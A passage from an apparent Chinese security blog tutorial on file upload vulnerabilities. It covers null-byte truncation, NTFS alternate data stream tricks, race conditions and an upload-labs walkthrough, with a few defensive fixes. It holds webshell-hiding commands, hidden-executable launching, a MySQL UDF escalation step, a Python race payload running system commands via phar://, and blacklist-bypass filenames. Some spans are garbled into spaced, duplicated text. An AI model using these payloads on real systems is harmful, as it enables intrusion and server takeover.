href="https://baike.baidu.com/item/301%E9%87%8D%E5%AE%9A%E5%90%91">301重定向</a>、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p></blockquote><hr><h4 id="6-文件系统00截断"><a href="#6-文件系统00截断" class="headerlink" title="6.文件系统00截断"></a>6.文件系统00截断</h4><p><strong>原理</strong></p><p><strong>在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束。</strong>利用00截断就是利用程序员在写程序时对文件的上传路径过滤不严格，产生0x00、%00上传截断漏洞。</p><p><strong>绕过方法</strong></p><p>通过抓包截断将【evil.php.jpg】后面的一个【.】换成【0x00】。在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束，从而将【evil.php.jpg】的内容写入到【evil.php】中，从而达到攻击的目的。</p><hr><h4 id="7-windows-NTFS文件系统特性绕过"><a href="#7-windows-NTFS文件系统特性绕过" class="headerlink" title="7.windows NTFS文件系统特性绕过"></a>7.windows NTFS文件系统特性绕过</h4><p>NTFS交换数据流（alternate data streams简称ADS）是NTFS磁盘格式的新特性，见漏洞详细可查CVE-1999-0278。</p><ul><li>一个完整的流的格式为：::</li><li>文件主流即我们平时可以看见的可以存储数据的文件。而非主文件流寄宿于主文件流中，无法直接读取。</li><li>修改宿主文件的内容或流的内容，不会对彼此造成影响。</li><li>流类型总是以 符 号 作 为 开 始 ， N T F S 文 件 系 统 中 的 文 件 至 少 包 含 一 个 主 流 ， 也 就 是 d a t a 流 ( 符号作为开始，NTFS文件系统中的文件至少包含一个主流，也就是data流( 符号作为开始，NTFS文件系统中的文件至少包含一个主流，也就是data流(DATA)，默认流名为空。</li><li>ADS可以省略流名，但不能省略流类型。</li><li>NTFS文件系统中的文件夹没有data流，但可以指派data流，文件夹的主流为directory流( I N D E X A L L O C A T I O N ) ， 流 名 默 认 为 INDEX_ALLOCATION)，流名默认为 INDEXALLOCATION)，流名默认为I30</li></ul><p>当我们对一个在NTFS分区中的ASP文件发出包含 D A T A 请 求 ， I I S 会 检 查 最 后 一 个 “ . ” 后 面 的 扩 展 名 ， 因 为 多 了 : : DATA请求，IIS会检查最后一个“.”后面的扩展名，因为多了:: DATA请求，IIS会检查最后一个“.”后面的扩展名，因为多了::DATA，结果IIS不认为这是一个ASP文件，而文件系统可以识别该请求，于是返回ASP的源代码。</p><p><strong>绕过方法</strong></p><ol><li>IIS目录访问权限绕过：在IIS6.0+PHP、IIS7+asp、IIS7.5+php的环境下，如果目录是通过HTTP Basic来认证，假设网站根目录存在index.php文件，可通过构造如下方式来绕过认证直接访问目录下的文件。</li></ol><pre><code>/admin::$INDEX_ALLOCATION/index.php/admin:$i30:$INDEX_ALLOCATION/index.asp</code></pre><ol><li>上传绕过黑名单：在测试中我们发现如果上传的文件名字为：test.php::$DATA，会在服务器上生成一个test.php的文件，其中内容和所上传文件内容相同，并被解析。</li></ol><table><thead><tr><th>上传的文件名</th><th>服务器表面现象</th><th>生成的文件内容</th></tr></thead><tbody><tr><td>Test.php:a.jpg</td><td>生成Test.php</td><td>空</td></tr><tr><td>Test.php::$DATA</td><td>生成test.php</td><td><?php phpinfo();?></td></tr><tr><td>Test.php::$INDEX_ALLOCATION</td><td>生成test.php文件夹</td><td></td></tr><tr><td>Test.php::$DATA\0.jpg</td><td>生成0.jpg</td><td><?php phpinfo();?></td></tr><tr><td>Test.php::$DATA\aaa.jpg</td><td>生成aaa.jpg</td><td><?php phpinfo();?></td></tr></tbody></table><blockquote><p><strong>注意：</strong><br>对于windows环境的服务器，上传test.php:.jpg类型的文件，当文件传到服务端时，windows会将该文件识别成ADS，从而认为其宿主文件名为1.asp而将.jpg识别为流名。<br>通过notepad test.php:.jpg可以查看内容，所以test.php内容为空是正常的。<br>然后修改上传的文件名为test.&gt;&gt;&gt;或者test.&lt;、test.&lt;&lt;&lt;、test.&gt;&gt;&lt;再上传，会重写test.php。原因是在PHP+IIS的环境下，” 同义. &gt;同义? &lt;同义*</p></blockquote><ol><li>隐藏webshell：在服务器上echo一个数据流文件进去，比如index.php是网页正常文件，命令如下：echo ^<?php @eval(request[cmd])?^ >> index.php:hidden.jpg这样生成了一个不可见的shell hidden.jpg，type dir del命令都不行。利用文件包含<?php include('shell.php:hidden.jpg')?>就是一句话。</li><li>mysql中的udf提权:</li></ol><blockquote><p>如果数据库用户对数据库mysql（注意指的是数据库里的默认库mysql）具有insert和delete权限，就可以创建加载自定义函数。<br>而又因为mysql服务是以system权限运行在windows主机上，所以这个时候我们就可以通过自定义函数以system权限执行命令了。</p></blockquote><p>如果数据库用户对数据库mysql（注意指的是数据库里的默认库mysql）具有insert和delete权限，就可以创建加载自定义函数。<br>而又因为mysql服务是以system权限运行在windows主机上，所以这个时候我们就可以通过自定义函数以system权限执行命令了。</p><p>Mysql 5.0.67之前，DLL的导入目录是C:\windows\system32<br>从MySQL 5.1开始，要求目录必须是mysql目录下的lib\plugin\目录，而且mysql 5.1之后的常用安装版本是默认不存在lib\plugin目录的。</p><p>执行sql语句</p><pre><code>show variables like &#39;%plugin%&#39;;</code></pre><p>查看目录位置。<br>利用ADS依次创建lib、plugin目录</p><pre><code>select &#39;xxx&#39; into outfile &#39;E:\\phpstudy\\PHPTutorial\\MySQL\\lib\\plugin::$INDEX_ALLOCATION&#39;;</code></pre><p>如果创建失败的话，执行</p><pre><code>show variables like &#39;%secure%&#39;;</code></pre><p>看看<strong>secure_file_priv</strong>的值：</p><p>如果创建失败的话，执行</p><pre><code>show variables like &#39;%secure%&#39;;</code></pre><p>看看secure_file_priv的值：</p><ul><li>null表示限制mysqld不允许导入导出</li><li>当secure_file_priv的值为&#x2F;tmp&#x2F;，表示限制mysqld 的导入导出只能在&#x2F;tmp&#x2F;目录下</li><li>当secure_file_priv的值为空，表示不对mysqld的导入导出做限制</li></ul><ol><li>隐藏exe文件</li></ol><pre><code>type muma.txt test.txt:muma.exe</code></pre><p>在xp中可以用start test.txt:muma.exe执行，但是win7以上这样执行会报错。win7及之后的系统的正确姿势如下：<br>创建一个符号链接文件test.exe，链接到寄生的交换数据流可执行文件test.txt:muma.exe上：mklink test.exe,test.txt:muma.exe，然后执行start test.exe &#x2F;b即可<br>更新一个方法：</p><pre><code>wmic process call create &quot;C:\ProjectCode\test\test:putty.exe&quot;</code></pre><blockquote><p>在WinXP中，可执行文件可以和文本文件一样实现真正的隐藏，这可能也是当时大多数杀毒软件添加数据流病毒查杀功能的原因；在Win7之后的系统中，微软可能出于安全考虑，不允许直接运行交换数据流可执行文件，必须要创建符号链接，这个符号链接是可见的（当然可以使用其他手段隐藏这个符号链接），并且这个符号链接创建出来后不能复制到其他地方，只能在创建的那个位置使用命令行方式调用（鼠标双击会报错）。</p></blockquote><p><strong>查看隐藏流文件</strong></p><blockquote><p>使用这两款小工具配合进行检测和清除寄生的交换数据流<br><a href="https://pan.baidu.com/share/link?shareid=134850&uk=1108295926">https://pan.baidu.com/share/link?shareid=134850&amp;uk=1108295926</a><br>labs.exe检测，streams.exe进行清理。<br>还有一个叫做AlternateStreamView的工具也可以</p></blockquote><hr><h4 id="8-二次渲染绕过"><a href="#8-二次渲染绕过" class="headerlink" title="8.二次渲染绕过"></a>8.二次渲染绕过</h4><p>感觉这个的知识点偏向文件格式分析(MISC)。在制作图片马的时候</p><p>往往是在图片后头附件一段php代码，或者是改包发送一个图片马。但是如果使用了二次渲染。我们上传的文件名称会被修改，并且文件末尾段一些冗余的信息（一句话木马）会被删除。</p><p>所以很明显，我们只需要将我们需要写入的东西塞在图片中间（虽然会使图片损坏，但是我们又不需要图片。。），用winhex或者是010editor等在文件内进行修改即可。</p><hr><h4 id="9-条件竞争"><a href="#9-条件竞争" class="headerlink" title="9.条件竞争"></a>9.条件竞争</h4><p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p><p>该漏洞一般出现在与数据库系统频繁交互的位置，例如金额同步、支付等较敏感操作处。另外条件竞争漏洞也会出现在其他位置，例如文件的操作处理等。</p><pre><code>#-*-coding:utf-8-*-import threadingCOUNT = 0def Run(threads_name):    global COUNT    read_value = COUNT    print &quot;COUNT in Thread-%s is %d&quot; % (str(threads_name), read_value)    COUNT = read_value + 1def main():    threads = []    for j in range(10):        t = threading.Thread(target=Run,args=(j,))        threads.append(t)        t.start()    for i in range(len(threads)):        threads[i].join()    print (&quot;Finally, The COUNT is %d&quot; % (COUNT,))if __name__ == &#39;__main__&#39;:    main()</code></pre><p>按照我们的预想，结果应该都是10，但是发现结果可能存在非预期解，并且出现非预期的概率还挺大的。</p><p>这是什么原因呢？</p><p>原因就在于我们没有对变量COUNT做同步制约，导致可能Thread-7在读COUNT,还没来得及更改COUNT,Thread-8抢夺资源，也来读COUNT,并且将COUNT修改为它读的结果+1，由此出现非预期。</p><p>同样的，WEB应用程序因为要为很多用户服务，势必要采用多线程，但是，如果种种原因导致线程间的同步机制没处理好，那么也就会导致非预期和条件竞争的漏洞。</p><p>例子：</p><p>例一：金额提现</p><p>假设现有一个用户在系统中共有2000元可以提现，他想全部提现。于是该用户同时发起两次提现请求，第一次提交请求提现2000元，系统已经创建了提现订单但还未来得及修改该用户剩余金额，此时第二次提现请求同样是提现2000元，于是程序在还未修改完上一次请求后的余额前就进行了余额判断，显然如果这里余额判断速度快于上一次余额修改速度，将会产生成功提现的两次订单，而数据库中余额也将变为-2000。而这产生的后果将会是平台多向该用户付出2000元</p><p>例二：moctf</p><p>打开网址后一直打开的是index2.php 修改为index.php后发现还是会跳转到index2 抓包修改index.php。<br><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p><p>发现index.php是一个302网页，因此就可以看到这里存在的一个文件uploadsomething.php。<br><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/20200314135623247.png" alt="在这里插入图片描述"></p><p>随便填写文件名下面写入代码，再进行提交。</p><p>访问后<br><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/20200314135639427.png" alt="在这里插入图片描述"><br>因此这里就需要用到条件竞争，不断的向网站发送请求，然后边发送边访问。</p><p>写入一个py文件一直发requests即可</p><pre><code>import requestsurl=&quot;http://119.23.73.3:5006/web2/uploads/b106f91010a3789acab1f27a00d67570052a7921/1.php&quot;while 1:    print (requests.get(url).text)</code></pre><p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/20200314171044419.png" alt="在这里插入图片描述"></p><p>例三：XMAN-Easy Gallery</p><p>伪协议读取代码</p><blockquote><p><a href="http://202.112.51.184:8004/index.php?page=php://filter/read=convert.base64-encode/resource=upload.php">http://202.112.51.184:8004/index.php?page=php://filter/read=convert.base64-encode/resource=upload.php</a></p></blockquote><pre><code>&lt;html lang=&quot;zh-CN&quot;&gt;  &lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;&lt;?php$error=$_FILES[&#39;pic&#39;][&#39;error&#39;];$tmpName=$_FILES[&#39;pic&#39;][&#39;tmp_name&#39;];$name=$_FILES[&#39;pic&#39;][&#39;name&#39;];$size=$_FILES[&#39;pic&#39;][&#39;size&#39;];$type=$_FILES[&#39;pic&#39;][&#39;type&#39;];try&#123;    if($name!==&quot;&quot;)    &#123;        $name1=substr($name,-4);        if(($name1!==&quot;.gif&quot;) and ($name1!==&quot;.jpg&quot;))        &#123;            echo &quot;hehe&quot;;            echo &quot;&lt;script language=javascript&gt;alert(&#39;不允许的文件类型！&#39;);history.go(-1)&lt;/script&gt;&quot;;            exit;        &#125;        if($type!==&quot;image/jpeg&quot;&amp;&amp;$type!==&quot;image/gif&quot;)        &#123;            echo mime_content_type($tmpName);            echo &quot;&lt;script language=javascript&gt;alert(&#39;不允许的文件类型！&#39;);history.go(-1)&lt;/script&gt;&quot;;            exit;        &#125;        if(is_uploaded_file($tmpName))&#123;            $time=time();            $rootpath=&#39;uploads/&#39;.$time.$name1;            if(!move_uploaded_file($tmpName,$rootpath))&#123;                echo &quot;&lt;script language=&#39;JavaScript&#39;&gt;alert(&#39;文件移动失败!&#39;);window.location=&#39;index.php?page=submit&#39;&lt;/script&gt;&quot;;                exit;            &#125;            else&#123;                sleep(5);                if ($type==&#39;image/jpeg&#39;)                &#123;                    $im = @imagecreatefromjpeg($rootpath);                    if(!$im)&#123;                      $im = imagecreatetruecolor(150, 30);                      $bg = imagecolorallocate($im, 255, 255, 255);                      $text_color = imagecolorallocate($im, 0, 0, 255);                      imagefilledrectangle($im, 0, 0, 150, 30, $bg);                      imagestring($im, 3, 5, 5, &quot;Error loading image&quot;, $text_color);                    &#125; else &#123;                        $time=time();                        $new_rootpath=&#39;uploads/&#39;.$time.$name1;                        imagejpeg($im,$new_rootpath);                    &#125;                &#125;                else if ($type==&#39;image/gif&#39;)                &#123;                    $im = @imagecreatefromgif($rootpath);                    if(!$im)&#123;                      $im = imagecreatetruecolor(150, 30);                      $bg = imagecolorallocate($im, 255, 255, 255);                      $text_color = imagecolorallocate($im, 0, 0, 255);                      imagefilledrectangle($im, 0, 0, 150, 30, $bg);                      imagestring($im, 3, 5, 5, &quot;Error loading image&quot;, $text_color);                    &#125; else &#123;                        $time=time();                        $new_rootpath=&#39;uploads/&#39;.$time.$name1;                        imagegif($im,$new_rootpath);                    &#125;                &#125;                unlink($rootpath);            &#125;        &#125;        echo &quot;图片ID：&quot;.$time;    &#125;&#125;catch(Exception $e)&#123;    echo &quot;ERROR&quot;;&#125;// ?&gt; &lt;/html&gt;</code></pre><p>首先是验证上传的文件是否为图片格式，如果上传了正确的图片，imagecreatefromjpeg()返回图像资源，文件名更换为新的时间戳，用新的文件路径 n e w r o o t p a t h 输 出 图 片 ， 最 后 删 除 原 文 件 u n l i n k ( new_rootpath输出图片，最后删除原文件unlink( newrootpath输出图片，最后删除原文件unlink(rootpath);如果上传了不正确的图片，不会更换新的文件路径，最后还要删除源文件unlink($rootpath);上传过程中存在一个延时函数sleep(5)，所以上传的文件即使验证不成功也有5秒钟的时间存在。</p><p>python的payload。</p><pre><code>import requestsimport timeid = int(time.time())s=requests.session()data0=&#123;&#39;v&#39;:&quot;phpinfo();&quot;,&#125;data1=&#123;    &#39;v&#39;:&quot;system(&#39;ls&#39;);&quot;&#125;data2=&#123;    &#39;v&#39;:&quot;system(&#39;cat xxxxxxxxxasdasf_flag.php&#39;);&quot;&#125;while 1:    for i in range(id-50,id+50):        url = &#39;http://202.112.51.184:9005/index.php?page=phar://./uploads/&#39; + str(i) + &#39;.jpg/v&#39;        t=s.post(url,data=data1).content        print i        if &#39;flag&#39; in t:            print t            break</code></pre><hr><h4 id="10-其它方式—绕过"><a href="#10-其它方式—绕过" class="headerlink" title="10.其它方式—绕过"></a>10.其它方式—绕过</h4><p><strong>原理</strong></p><p><strong>部分程序员的思维不严谨，并使用逻辑不完善的上传文件合法性检测手段，导致可以找到方式绕过其检测方式。</strong></p><p><strong>绕过方法</strong></p><ul><li>后缀名大小写绕过 用于只将小写的脚本后缀名(如php)过滤掉的场合； 例如:将Burpsuite截获的数据包中的文件名【evil.php】改为【evil.Php】</li><li>双写后缀名绕过 用于只将文件后缀名过滤掉的场合，例如”php”字符串过滤的； 例如:上传时将Burpsuite截获的数据包中文件名【evil.php】改为【evil.pphphp】，那么过滤了第一个”php”字符串”后，开头的’p’和结尾的’hp’就组合又形成了【php】。</li><li>特殊后缀名绕过 用于检测文件合法性的脚本有问题的场合； 例如:将Burpsuite截获的数据包中【evil.php】名字改为【evil.php6】，或加个空格改为【evil.php 】等。</li></ul><hr><hr><h3 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h3><p><a href="https://download.csdn.net/download/qq_43390703/12248471">靶场资源链接、环境资源一键安装</a></p><p>实战依据upload靶场进行实验训练，upload靶场涵盖目前所有类型的上传漏洞，将靶场漏洞题目全部刷完即可完全全部的上传漏洞的训练。</p><p>首先对一个文件进行分析，从而对PHP和源代码环境进行深入理解。</p><pre><code>&lt;li id=&quot;show_code&quot;&gt;    &lt;h3&gt;代码&lt;/h3&gt;&lt;pre&gt;&lt;code class=&quot;line-numbers language-php&quot;&gt;$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#39;.&#39;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空                if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#39;上传出错！&#39;;            &#125;        &#125; else &#123;            $msg = &#39;此文件类型不允许上传！&#39;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    &#125;&#125;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;</code></pre><p>文件基本格式步分析。</p><blockquote><p>deny_ext :黑名单列表</p><p>trim(): :删除字符串两端的空格或其他预定义字符。用trim()函移除字符。我们没有添加移除的字符，就默认移除下列字符”\0” - NULL、”\t” - 制表符、”\n” - 换行、”\x0B” - 垂直制表符、”\r” - 回车、” “ - 空格（ltrm、rtrim）</p><p>deldot() :把文件后面的点删除windows的特性会自动对后缀名去”.” 处理比如: webshell.php. 。</p><p>strrchr() :查找字符串在另一个字符串中最后-次出现的位置,并返回从该位置到字符串结尾的所有字符(截取后缀)</p><p>str_ireplace():替换字符串中的一些字符（不区分大小写）。遵循的一些规则如果搜索的字符串是一个数组那么它会返回一个数组，且对数组中的每个元素进行查找和替换。（str_replace区分大小写）用str_ireplace(’::$DATA’, ‘’, f i l e e x t ) 函 数 防 止 在 后 缀 中 添 加 “ : : file_ext)函数防止在后缀中添加”:: fileext)函数防止在后缀中添加”::DATA”绕过利用windows特性，可在后缀名中加” ::$DATA”绕过</p><p>strtolower(): 故名思意</p><p>strrpos() 函数查找字符串在另一字符串中最后一次出现的位置。strrpos() 函数对大小写敏感。</p><ul><li><a href="https://www.w3school.com.cn/php/func_string_stripos.asp">stripos()</a> - 查找字符串在另一字符串中第一次出现的位置（不区分大小写）</li><li><a href="https://www.w3school.com.cn/php/func_string_strpos.asp">strpos()</a> - 查找字符串在另一字符串中第一次出现的位置（区分大小写）</li><li><a href="https://www.w3school.com.cn/php/func_string_strripos.asp">strripos()</a> - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）<br>getimagesize() :用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</li></ul></blockquote><p>通过上面对整体内容有了大概理解。开始闯关刷题。</p><hr><p>**场景一 **</p><p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-16798388586101.png" alt="Sample"></p><p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-16798388586102.png" alt="Sample"></p><p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-16798388586103.png" alt="Sample"></p><p>绕过前端即可，将文件名改成jpg，上传后用burpsuit修改后缀名，之后查看包反馈的文件路径，再用中国菜刀连接一句话木马，完成夺下目标。这些流程都是一样的，只不过是绕过不妨不同，后面两步在后面不做重复说明。</p><hr><p><strong>场景二</strong></p><p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-16798388586104.png" alt="Sample"></p><p>修改类型检查，如上图（箭头提示作用，实际不存在）</p><hr><p><strong>场景三</strong></p><pre><code>#后缀绕过常用手段PHP:php2、php3、php5、phtml、pht(是否解析需要根据配置文件中设置类型来决定)ASP：asa、cer、cdxASPX：ascx、ashx、asacJSP：jsp、jspx、jspf</code></pre><p>为什么上面的东西可以绕过呢？</p><p>这是利用了配置中正则解析的小错误实现的。</p><p>这些后缀名都可以被当做php文件执行。符合的后缀包括 php、php3、php4、php5、phtml、pht等，有时候需要挨个进行尝试</p><p>如同场景一进行修改后缀操作，不同的是这里不需要改包，通过burpsuit获得上传文件路径即可，直接用中国菜刀进行连接，因为上面的后缀修改后都可以解析成相应的文件（phtml-&gt;php）<br>此处将文件后缀名进行修改即可。</p><hr><p><strong>场景四</strong></p><p>有两种思路。</p><p>1：不能上传php，但能上传php.jpg,php.asd，说明是黑名单限制，但是场景三中方法如：php3,phtml都被限制了，查看提示几乎所有可以绕过的后缀名都被限制了，但是没有禁止.htaccess，可以先上传一个.htaccess覆写后让所有文件解析为php，然后再上传一个图片马</p><blockquote><p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p></blockquote><pre><code>//.htaccess  修改文件SetHandler application/x-httpd-php</code></pre><p>先上传文件.htaccess然后再上传图片格式的一句话木马，之后直接用中国菜刀连接即可。原因：所有图片信息再上面文件的配置下都会解析成php文件。</p><p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-16798388586105.png" alt="Sample"></p><p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-16798388586106.png" alt="Sample"></p><p>2：后缀名冗余(未知拓展名绕过)绕过，例如修改成one.php.aaa、one.php.xxxx等。然后直接使用中国菜刀连接。</p><p>原理：本质为apache解析漏洞。apache中的主配置文件httpd.conf中存在DefaultType用于告诉apache该如何处理未知扩展名的文件，比如something.xxx这样的文件，扩展名是xxx，这肯定不是一个正常的网页或脚本文件，这个参数就是告诉apache该怎么处理这种未知扩展名的文件。</p><p>参数DefaultType的默认值是“text&#x2F;plain”，也就是遇到未知扩展名的文件，就把它当作普通的txt文本或html文件来处理。文件内容为php代码的未知扩展名文件来说也是解析成文本对于something.php.xxx的多扩展名的文件，那么就会被以module方式运行php的apache解析，因为Apache认为一个文件可以拥有多个扩展名，哪怕没有文件名，也可以拥有多个扩展名。Apache认为应该从右到左开始判断解析方法的。如果最右侧的扩展名为不可识别的，就继续往左判断，直到判断到文件名为止。</p><p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-16798388586117.png" alt="Sample"></p><p><strong>未知拓展名漏洞防御解决</strong></p><blockquote><blockquote><p>解决方案一</p></blockquote><p>在httpd.conf或httpd-vhosts.conf中加入以下语句，从而禁止文件名格式为*.php.*的访问权限：</p><p>&lt;FilesMatch “.(php.|php3.|php4.|php5.)”&gt;<br>Order Deny,Allow<br>Deny from all</p><p>解决方案二</p><p>如果需要保留文件名，可以修改程序源代码，替换上传文件名中的“.”为“_”：</p><p>$filename &#x3D; str_replace(’.’, ‘_’, $filename);</p></blockquote><hr><p><strong>场景五\场景六</strong></p><p>使用场景四中的增加后缀冗余实现绕过。</p><hr><p><strong>场景七</strong></p><p>3个思路</p><p>1.文件“.”后增加空格。两图</p><p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-16798388586118.png" alt="Sample"></p><p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-16798388586119.png" alt="Sample"></p><p>2.如场景四，采用后缀名冗余，即使用one.php.xxxx类似的文件名或者改包为这样的文件名绕过。</p><p>3.在文件名后加一个”.”，例如one.php.但是我实际操作的时候需要加上一个空格才会成功。</p><hr><p><strong>场景八</strong></p><p>很明显，没有过滤尾部”.”，这样burpsuit在one.php后面加上一个点绕过黑名单检查，并且能被php解析。</p><p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861110.png" alt="Sample"></p><hr><p><strong>场景九</strong></p><ol><li>利用上述方法中的第7点windows NTFS文件系统特性绕过。传上one.php，burpsuit改包，增加后缀::$DATA即可上传并获得上传路径。</li><li>冗余后缀名</li></ol><p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861111.png" alt="Sample"></p><hr><p><strong>场景十</strong></p><p>冗余后缀名。。。。（真好用，大部分黑名单都可以过，更说明黑名单是很不安全的）</p><hr><p><strong>场景十一</strong></p><p>这个上传发现什么都可以传，但是其后缀被修改了，无法正常解析。因为下面这句新增的控制语句：</p><pre><code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></pre><p>说明只要出现黑名单里面的字样都会被替换成空格。有什么办法绕过呢？这个就像脑筋急转弯一样。</p><p>我们不妨构造类似pphphp这种字段的后缀，这里有个地方可以思考，那就是构造这种模式的字符串是按照从前往后替换还是从前往后替换呢？也就是pphphp、phphpp是否能行？都行，还是那个行那个不行。这个可以动手尝试一下</p><blockquote><p>pphphp(php) phphpp(hpp)</p></blockquote><hr><p><strong>场景十二</strong></p><pre><code>$is_upload = false;$msg = null;if(isset($_POST[&#39;submit&#39;]))&#123;    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);    $file_ext = 